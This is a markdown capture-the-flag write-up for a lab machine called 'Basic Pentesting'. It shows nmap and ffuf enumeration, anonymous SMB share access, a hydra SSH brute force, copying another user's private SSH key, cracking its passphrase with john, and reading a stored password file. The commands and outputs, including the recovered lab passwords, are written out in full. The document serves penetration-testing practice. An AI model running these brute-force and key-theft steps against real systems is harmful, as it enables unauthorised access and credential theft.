# Basic Pentesting 
## Enumeration:
```
nmap -sV -sC --open $IP
```
### Result:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 16:31 EDT
Nmap scan report for $IP
Host is up (0.34s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 49:49:76:49:9e:26:e6:e1:8c:37:87:3d:20:4f:71:71 (RSA)
|   256 b6:63:39:ed:ee:a8:5d:ba:32:c3:a0:c7:05:01:92:6d (ECDSA)
|_  256 b6:83:6e:76:60:81:85:ba:06:bf:1b:d0:f5:e4:7c:6d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.27 seconds
```

## Directory Enumeration
```
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 300 -s  -c
```
### Result:
```
# Priority-ordered case-sensitive list, where entries were found
# on at least 3 different hosts
#
# Suite 300, San Francisco, California, 94105, USA.
# Copyright 2007 James Fisher
#
# license, visit http://creativecommons.org/licenses/by-sa/3.0/
#
# directory-list-2.3-small.txt
# Attribution-Share Alike 3.0 License. To view a copy of this
# or send a letter to Creative Commons, 171 Second Street,
#
# This work is licensed under the Creative Commons

development
```
## Initial Access:
### Enumerate smb:
```
smbclient -L //$IP
```
```
Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server $IP (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
### Connect smb:
```
smbclient //$IP/Anonymous 
Password for [WORKGROUP\kalibase]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14282840 blocks of size 1024. 6433056 blocks available
smb: \> get staff.txt
```
<details>
  <summary><i>staff.txt</summary</i></summary> 
        
```   
        Announcement to staff:
PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)
-Kay
```

</details>

## Brute Force:
```
hydra $IP -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh
```
### Result:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 17:13:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://$IP/
[STATUS] 400.00 tries/min, 400 tries in 00:01h, 14344050 to do in 597:41h, 13 active
[STATUS] 252.33 tries/min, 757 tries in 00:03h, 14343693 to do in 947:25h, 13 active
[22][ssh] host: $IP   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```

## Login SSH (Jan):
```
ssh jan@$ip
```
### Get SSH credentials:
```
jan@$IP:~$ cd /home/kay/.ssh
scp jan@$IP:/home/kay/.ssh/id_rsa ./
```

## Lateral Movement:
```
 ssh2john id_rsa > rsa_john.txt
 john rsa_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
### Result:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2025-09-26 17:39) 10.00g/s 827360p/s 827360c/s 827360C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Login SSH (Kay):
```
ssh kay@$IP -i id_rsa
Enter passphrase for key 'id_rsa':
kay@ip-10-201-106-124:~$ cat pass.bak
```
<details>
  <summary><i>pass.bak</summary</i></summary> 
        
```   
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

</details>
